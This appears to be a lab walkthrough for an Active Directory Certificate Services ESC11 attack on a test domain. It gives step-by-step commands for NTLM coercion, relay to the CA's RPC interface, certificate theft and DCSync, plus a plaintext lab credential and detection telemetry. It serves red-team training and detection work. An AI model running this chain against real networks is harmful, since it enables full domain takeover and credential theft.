# WT#059 — ESC11: RPC Interface without Integrity

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | Machine (or any) |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | impacket-ntlmrelayx, coercer |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1557, T1649 |
| **Difficulty** | Hard |

## Prerequisites
- CA service running on dc01
- ICPR (ICertPassage) RPC interface accessible on port 445
- `IF_ENFORCEENCRYPTICERTREQUEST` registry value NOT set (or = 0)
- Network path to coerce dc01 authentication to attacker machine

## Attack Steps

### 1. Check RPC encryption enforcement
```powershell
certutil -config "cadre.local\cadre-CA" -getreg policy\EditFlags
# Verify IF_ENFORCEENCRYPTICERTREQUEST is NOT present
```

### 2. Start NTLM relay to ADCS RPC endpoint
```bash
impacket-ntlmrelayx -t rpc://dc01.cadre.local -smb2support --adcs --template Machine
```

### 3. Coerce dc01 to authenticate to attacker
```bash
coercer coerce -l 192.168.77.100 -t 192.168.77.10 -u analyst_dfir -p 'An@lyst_DF1R!' -d cadre.local
```

### 4. Use dc01$ certificate for DCSync
```powershell
certipy-ad auth -pfx dc01.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

## Post-Exploitation Chain
ESC11 → Coerce dc01 auth → Relay to RPC (no integrity) → dc01$ machine cert → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: Machine certificate enrollment for dc01$ via RPC
- **Event 5156**: WFP connection on port 445
- **RPC logs**: ICertPassage RPC calls from attacker IP
- **Registry**: `IF_ENFORCEENCRYPTICERTREQUEST` missing or set to 0
- **Sysmon Event 1**: ntlmrelayx, coercer process creation
## Status
CONFIGURED — ESC11 ICPR enabled on cadre-CA, IF_ENFORCEENCRYPTICERTREQUEST not set
